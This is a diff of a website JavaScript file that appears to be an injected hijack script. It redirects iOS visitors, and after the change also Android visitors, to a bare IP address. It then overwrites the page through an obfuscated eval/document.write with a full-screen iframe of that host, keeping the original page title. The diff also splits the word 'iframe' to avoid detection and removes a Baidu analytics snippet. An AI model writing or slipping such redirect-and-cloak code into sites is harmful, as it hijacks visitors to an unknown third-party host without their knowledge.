@@ -1,16 +1,17 @@
-//lxxaisite
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.32";
+    window.location.href = "http://38.26.195.34";
+}else if (/(Android)/i.test(navigator.userAgent)) {
+    //alert(navigator.userAgent); 
+    window.location.href = "http://38.26.195.34";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.32");
+setFrame("http://38.26.195.34");
 
 
 
 function setFrame(olink){
-    var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
-	
+    var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
     eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
     try {
       setTimeout(function() {
@@ -25,7 +26,7 @@ function setFrame(olink){
             }
           } catch (e) {}
         }
-        document.getElementById("showcloneshengxiaon").innerHTML = '<object type="text/html" data="'+olink+'" width="100%" height="100%"></object>';
+        
          var oMeta = document.createElement('meta');
         oMeta.name = 'viewport';
         oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
@@ -34,11 +35,3 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
-
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?49ea7ae952568ca6e9bddb7bd0e0d62f";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
